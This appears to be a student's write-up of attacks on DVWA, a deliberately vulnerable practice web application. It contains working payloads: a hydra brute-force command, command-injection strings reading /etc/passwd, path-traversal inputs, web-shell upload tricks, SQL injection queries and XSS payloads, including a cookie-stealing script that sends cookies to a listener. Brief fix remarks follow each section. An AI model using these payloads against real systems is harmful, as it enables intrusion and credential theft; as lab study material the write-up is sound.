# DVWA
This project tests on the DVWA website 

## Setup
To setup DVWA, follow the following website:
https://nooblinux.com/how-to-install-dvwa/

## 1. Brute Force Password
### Low and Medium
To run a brute force search on DVWA, burp suite is used. Burp suite is used to intercept the requests that are sent to the DVWA website. 
To setup:
1. Go to Proxy -> Options - Note the IP address and Port
2. Go to Intercept - Make sure that the intercept is on

Within a browser: 
1. Go to Network settings and set proxy address and the port to the noted down IP address and port number.
2. Set allow intercept in about:config for network.proxy to be true.


#### (Option 1) Run Hydra (a brute force tool):
1. Run the following command: hydra <DVWA Ip address> -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=Low; PHPSESSIONID=eogppved743ckngeo0so6tnp87"
 Command Detaials:
 * -l - Username
 * -P - file that consists of frequently used passwords 
 * -http-get-form - tells hydra to get use a GET request form to submit the details
 * username=^USER^&password=^PASS^ - Places for the custom username and password
 * :F= - Faliure Message
 * :H= - Cookie information

 #### (Option 2) Run BurpSuite:
 1. After incepting the traffic, right click on the captured data and send to intruder
 2. In the intruder tab, under positions, change the attack type to ```Cluster bomb```
 3. Click the ![image](https://user-images.githubusercontent.com/39514108/145332448-36683182-a233-4ef9-8259-817eccc8e886.png) sign. Then ![image](https://user-images.githubusercontent.com/39514108/145332475-ff1a7c9a-006d-42e6-b12e-3fc8fff25015.png) for the username and password fields like below:
 ![image](https://user-images.githubusercontent.com/39514108/145332493-f3066fb7-64ea-4b59-ad9b-6517067aab38.png)
4. Within the payloads tab, insert the wordlist for the username in Payload set 1, and the wordlist for the password in Payload set 2. After starting the attack, the following is observed. Note that the lenght difference indicates that it was a successful attack. 
 ![image](https://user-images.githubusercontent.com/39514108/145332329-9ce1c01a-833d-426a-a5bb-de345bc01050.png)
 
 ### High
 
 The CSRF token is required to login. Hence, setting the user_token field found after inspecting the page, to be recursive grep where the token is constantly changed helps to brute force the search. The offset is taken from the point at which the user_token field is indicated (If the DOC is not found, resend a new request to the intruder).
![image](https://user-images.githubusercontent.com/39514108/145777006-d7a501ad-be0b-4df7-9f77-3e8a53da1151.png)
 1. Set the attack type to be pitchfork (sets the payloads in order) and the password and user_token to be custom variables.
 2. Load the list.
 3. Set the grep match to be incorrect ![image](https://user-images.githubusercontent.com/39514108/145777551-b2c72985-24a0-4551-ab1c-ed8f75e88067.png)
 4. Set the redirections to be always. ![image](https://user-images.githubusercontent.com/39514108/145777626-39f44f9c-23b5-43de-98a1-1fac22bff62c.png)
 5. Set the second payload (user_token) to eb recursive grep to allow the user_token to be trialed.
 6. Set the resource pool to have 1 concurrent thread
 
 After running the attack, the username and password with the CSRF token is found. 
 ![image](https://user-images.githubusercontent.com/39514108/145777913-2cd3c865-e74f-48b0-b08b-a675e03b0231.png)
 From this, we can see the CSRF token is used from the previous session. Hence, we can take the last request and paste that as the CSRF token in our browser. After using the username: admin and password: password, the login is done:
 ![image](https://user-images.githubusercontent.com/39514108/145778633-52922bd6-f8ee-4e7b-bdaa-041da66ab331.png)
 
 ### Brute force Remarks
 
 To make the page secure, enforce password policies and maximum attempts on the password. Extra security features such as enabling 2MFA is also recommended.

## 2. Command Injection
### Low
 In the command injection page, where the source code is shown below, the developer did not sanitise the input. 
![image](https://user-images.githubusercontent.com/39514108/145917705-140a128a-10da-4c18-b483-dfd2a56a1376.png)
This means that strings can be taken as a command. This means that we can execute extra commands with the use of ```;```. For example after executing: ```;cat /etc/passwd``` which gets the password file, the passwords are found:
 ![image](https://user-images.githubusercontent.com/39514108/145918303-eac42787-9451-416f-a1e4-4b8a1764a576.png)
Note that the use of ```;``` means that the command will execute regardless of whether the command before it was successful.
 
 ### Medium
 Upon viewing the source code as shown below, the && and ; characters are replaced. We can counteract this by using & which also executes the command.
 ![image](https://user-images.githubusercontent.com/39514108/145918619-c2c76272-1d9b-4ea0-b17a-f807c9734a4e.png). For example, after executing: ```8.8.8.8&cat /etc/passwd``` the password file is also displayed. Note that:
 * & - asynchronous 
 * | - takes the ouput from the first command to the second command
 * || - executed after the first command if it doesn't have a exit status of 0
 * && - executed after the first command if it does have a exit status of 0

### High
 Again when viewing the source code as shown below, all strings that matched are replaced. 
 ![image](https://user-images.githubusercontent.com/39514108/145919178-edd5a0df-67fc-4640-89c2-695f7be2979e.png)
This means that the command of ```|| ``` can still be used. This is because the array will match on the first occurance, hence, the first ```|``` will still remain. Furthermore, since the array matches on ```| ``` (with a space at the end), a single pipe will still work. The following commands can be used to exploit the vulnerability:
 * |cat /etc/passwd
 * || cat /etc/passwd
 
 ### Remarks
 To fix the code:
 1. Validate user input - by checking whether they have entered a valid IP address (whether the input is a number and in the specified format.)
 2. Escape shell arguemtns - by calling the escapeshellarg() function
 3. Treat all user input as strings 
 
## 3. CSRF
 CSRF is an attack in which a user clicks on a link which sends a request on the behalf of the user to a trsuted site. In this example, this is where a change request is made by the user.
 
 ### Easy
 After submitting the password change, a link is created: http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=new_password&password_conf=new_password&Change=Change#. This can be sent to the user which could be embedded in a website such that the user's password is changed. 
 
 ### Medium
 In this case, the site now validates where the request is coming from. For example, after executing the above url, the following is displayed:
 ![image](https://user-images.githubusercontent.com/39514108/146326082-8fb358aa-1005-40f2-903d-50122e0b88bb.png). After observing the requests, we can see that the referer is missing:
  ![image](https://user-images.githubusercontent.com/39514108/146326273-8cfbbd02-d337-401d-baa7-fe270ec598c5.png) 
 in comparison to ![image](https://user-images.githubusercontent.com/39514108/146326420-63f7d94e-0d00-4712-8e63-772d3e5252b3.png)
After embedding a script and executing it like so: ![image](https://user-images.githubusercontent.com/39514108/146328932-569c99a4-5882-4745-b687-da9282c8fb07.png)
 
, the password is not changed as the referrer is missing. So instead, reflective xss can be used. This is where the user can add in code in a function within the page to send requests (hence, the referrer will be the same). We can embed, the following in the stored xss page which will then change the password:
 
![image](https://user-images.githubusercontent.com/39514108/146330227-00b5b314-16aa-4b32-b13c-293ca730e31c.png)
 
 ![image](https://user-images.githubusercontent.com/39514108/146330296-a6ee5050-aadf-46e7-b1ca-5c79bf52ff8e.png)
 
We can also construct a request in burp suite that includes the referrer. 
 ![image](https://user-images.githubusercontent.com/39514108/146330940-ad126570-6773-45fb-ab2a-e14171451a40.png). After forwarding the request, the password is also changed.
 
 ### High
 After sending a request through to change the password we can see the following request being made, where an anti-CSRF token is added. 
 
 However, after inspecting the page, we see a hidden token that is attached to the page, ![image](https://user-images.githubusercontent.com/39514108/146333155-6acea507-a33e-4cdd-88ed-522c7cd9ffd4.png). 
 This means that we can create another request which incorporates the next value to send to the webpage. For example, by using the following link:
 http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=janel&password_conf=janel&Change=Change&user_token=6c3e10f0fc44c8249e70ce243b4c9e96 (which the user token is gained after refreshing the page), the password is changed.
 
 ### Remarks
 
 To prevent CSRF attacks, same-site cookies or asking for the current user's password can be used. 

 # File Inclusion
 
 This attack allows an attacker to view or execute files locally on a machine. Local File Inclusion (LFI) is where the files can are viewed or executed locally on the target machine whereas Remote File Inclusion (RFI) is where code hosted by another machine is executed on the local machine.
 
 ## Low
 
 To uncover the text, the directory of ../../hackable/flags/fi.php is tried. The levels of directory is obtained by trail and error.
 ![image](https://user-images.githubusercontent.com/39514108/149444263-03827bfa-9e64-4f05-9763-30e8a088c9e6.png)
 We can also see the password file by ../../../../../../etc/passwd.
 
 ## Medium
 
 In this example, the ../ are filtered. Hence, the following can be used to avoid the pattern match: ....//....//hackable/flags/fi.php. To access the password file, the following can be used: /etc/passwd
 
 ## High
 
In this example, the file name must be include.php or start with file://. Hence, the following can be used: file:///var/www/html/DVWA-master/hackable/flags/fi.php. 
 
 ## Remarks 

 Use least privilege to allow only the appropriate files.
 
 # File Upload
 
 This attack is where an attacker is able to upload a file and execute php on to it. 
 
 ## Low
 
 In a new file, the following line was entered into it. ![image](https://user-images.githubusercontent.com/39514108/149447253-1a14ab50-05e8-415b-9f35-8efbc9692833.png)
After uploading the file and navigating to it and executing a command ``ls ``, we can see that commands can be executed:
 ![image](https://user-images.githubusercontent.com/39514108/149447479-cf64b451-7561-4a12-a2da-909cee9aa972.png)
 ![image](https://user-images.githubusercontent.com/39514108/149447508-aa139dba-2c52-4e53-8430-4f049d0f66fe.png)

 ## Medium
 
 Now the page only allows jpeg or png images. We can change the content type of the request to be image/jpeg to avoid this: ![image](https://user-images.githubusercontent.com/39514108/149448254-8494a3dd-04af-4d50-a3f9-2ce6c4d7addf.png)
 We can see that after executing the file, the following can then be displayed: ![image](https://user-images.githubusercontent.com/39514108/149448221-b4400ac5-954c-4377-a4ab-cdf7162554c3.png)

 ## High
 
The page now requires that jpg or png are in the file using byte checks. Hence, the following command can be used to append a php command to a png image. 
 ![image](https://user-images.githubusercontent.com/39514108/149449250-cf5476b9-81b7-4627-8d5a-f81c3281e89b.png)
 
 Then using another vulnerability such as command injection: ``127.0.0.1|mv ../../hackable/uploads/dollar.png ../../hackable/uploads/dollar.php`` to rename the file, the following command can be executed: 
 ![image](https://user-images.githubusercontent.com/39514108/149450399-691ed50c-0972-4781-a334-1fd2106fd524.png)

## Remarks
 
 Need to recreate image by strippping the metadata and re-encoding it.
 
 # Insecure Captcha
 
 Captcha is a program that is used to check if the user is a legitimate user or a bot. 

 ## Low 
 
 In this example, the developer requests for a password change, but htere is a hidden form where step=2 to verify that the password has been changed. By sending the request for the password changed through burpsuite, this changes the password. 
 ![image](https://user-images.githubusercontent.com/39514108/149611688-3646cd5d-783f-4ceb-b9e0-234e620a1aa7.png)

 ## Medium

 Medium level is similiar to the low level, but instead an extra parameter of ``passed_captcha`` is added. This parameter can be manipulated and exploited by an attacker as shown below.
 ![image](https://user-images.githubusercontent.com/39514108/149684447-141c9f5b-b994-4316-9cb9-74d01fef7542.png)

 ## High
 
 The dev note as indicated noted that the request required parameters such as the captcha response and the user-agent. By changing the values in the corresponding header, we can see the password changed.
 
 ![image](https://user-images.githubusercontent.com/39514108/149684822-d260d071-ae5f-4408-b391-cdfe6a66b0e0.png)
 
 ## Remarks
 
 By requiring the user to enter their current password, this prevents the ability of the attacker to change the password.
 
 # SQL Injection
 
 SQL injection is an attack that uses SQL rules to exploit the vulnerbility of a developer not sanitising the user's input.
 
 ## Low 
 
 By using the comment symbol, this ignores any arguments that are present in the SQL request. We can see in the following command ``1' OR 1=1 UNION SELECT user, password FROM users;#``, the five users and their corresponding passwords can be found. Note that the columns are normally named columns for usernames and passwords. The users database is found in the source code.
 
 ![image](https://user-images.githubusercontent.com/39514108/149685551-05ae3d2d-ed62-4dd6-b680-b8374b12ba73.png)

 ## Medium
 
Now the developer uses a defulat option list to the request through. However, the parameters are stil sent in the request which can then be altered. The developer also uses real_escape_strings. This can be circumvented by not using quotations. The following snippet shows successful passwords and usernames that are found.
 
 ![image](https://user-images.githubusercontent.com/39514108/149686009-7bc3b47c-413e-4118-b0e0-8456bc75283b.png)
 
 ## High
 
 The high level is similar to the low level injection where the same command used in the low level can be used to exploit the vulnerability.
 
 ## Remarks 
 
 To prevent against SQL injection attacks, one must ensure that the data is sanitized and checked for the right format (e.g. if it is a number, etc.)
 
 ![image](https://user-images.githubusercontent.com/39514108/149686121-fec9215b-8970-4ce0-bbcc-8bc795b950b2.png) 
 
 # SQL Injection (Blind)

 This attack is similar to normal SQL Injection attacks but the attack uses a timer to determine whether the query was successful. If the query was unsuccessful, it is able to use the timing to determine what action to take next. This requires that the developer is specifying a generic error page when an unsuccessful SQL query is entered.
 
 ## Low
 
We can use the response to determine whether the version number is correct. For example, using the following command `` 1' and substring(version(),1,1) = 2-- -``. This helps to check for the version number of the database, if it is correct, a success message appears. We can try this for the remaining characters. 
 
 ## Medium and High
 
 Similar to SQL Injection
 
 # Weak Session IDs
 
 Session IDs are used to indicate that a particular user has logged into a website. Hence, session IDs must not be easily guessed by attackers.
 
 ## Low 
 
 After investigating the storage tab which contains the cookies, we can see that everytime the generate button is clicked, the cookie value is increased by 1. Hence, the sequence is increasing by 1. 
 
 ![image](https://user-images.githubusercontent.com/39514108/149856681-6d5d8ecb-cfe1-4fd4-a446-b7ccf77cccae.png)

 
 ## Medium
 
 After investigating the cookies, it seems like a unix timestamp. BY validating this we can see that the value of the cookie corresponded to a timestamp.
 
 ![image](https://user-images.githubusercontent.com/39514108/149857178-f83cd984-e96b-4c10-80b6-b01ccddc2431.png)
 
 ![image](https://user-images.githubusercontent.com/39514108/149857153-37f7dc85-8bcc-4df7-aa60-1bd68beba780.png)

 ## High
 
 By viewing the hash we can see that it is a short hash. Unlike base64, it does not have ``==`` signs with it, hence it is most likely to be a md5 hash. We can decode the hashes which result in a incremental increase. Therefore, the algorithm is where the number is incremented and hased with md5. 
 
 ![image](https://user-images.githubusercontent.com/39514108/149857709-99dbffe7-a913-47b1-9b96-19de3f54757e.png)

 ## Remarks

 This uses a random number with the current time to set the value.
 
 # XSS (DOM)
 
 This attack is where the Javascript is hidden within in the URL and the script is executed when the page is rendered.
 
 ## Low
 
 In this level, the javascript is not sanitised. Hence, we can add in the the following into the URL ``http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/?default=<script>alert("hi")</script>``
 
 ![image](https://user-images.githubusercontent.com/39514108/149858355-e90a6cb0-d432-4241-b96d-ec2390a69a9a.png)

 ## Medium
 
Now the page rejects any ``<script`` patterns. We can circumvent this by adding an image tag with the action to alert the message. For example, using the following URL we can achieve the goal of displaying the message: http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/?default=1</select><img src=image.png onerror=alert(1)/>
 Note that the select tag is used as after exmaining the source code, the select tag needs to be closed on the option list.
 
 ![image](https://user-images.githubusercontent.com/39514108/149859581-c42167a2-7f42-4741-ade8-b35735581303.png)

 ## High
 
 Now the site only accepts the language names that listed. Therefore, in order to pass this level, the ``#`` can be added in the URL to execute the script. This sign avoids sending the remaining of the URL to the server. Hence the following URL is used: This results in the following page:http://127.0.0.1/DVWA-master/vulnerabilities/xss_d/?#default=<script>alert("hi")</script>

 ![image](https://user-images.githubusercontent.com/39514108/149860599-7c2fa66f-4dcd-4389-87ff-e736c678861f.png)

 ## Remarks
 
 The input is encoded to prevent it from being executed.
 
 # XSS (Reflected)
 
 This is an attack where a link is sent to the victim whom after clicking on the link executes the malicious script.
 
 ## Low
 
We can use the following script to execute it: `` <script>window.location='http://127.0.0.1:1337?cookie='+document.cookie</script>``. This sets the clicked on link to redirect the cookie to out http server. Now after this is executed our webserver receives the request:

 ![image](https://user-images.githubusercontent.com/39514108/149861915-33293ed4-2b06-4f55-aa37-9d58853c85cb.png)

 ## Medium
 
 Now the page checks for the <script> tag. This can be avoided in several ways:
 
 * <img src=image.png onerror=alert(document.cookie)>
 * <scr<script>ipt>alert(document.cookie)</script>
 * <SCRIPT>alert(document.cookie)</SCRIPT>
 
 ## High
 
 The following can be used to pass the level:
 
 *  <img src=image.png onerror=alert(document.cookie)>
 
 Or all image tags of HTML events.
 
 ## Remarks
 
 PHP function such as ``htmlspecialchars()`` should be used to escape any characters that are present. 
 
 # XSS (Stored)
 
 
 

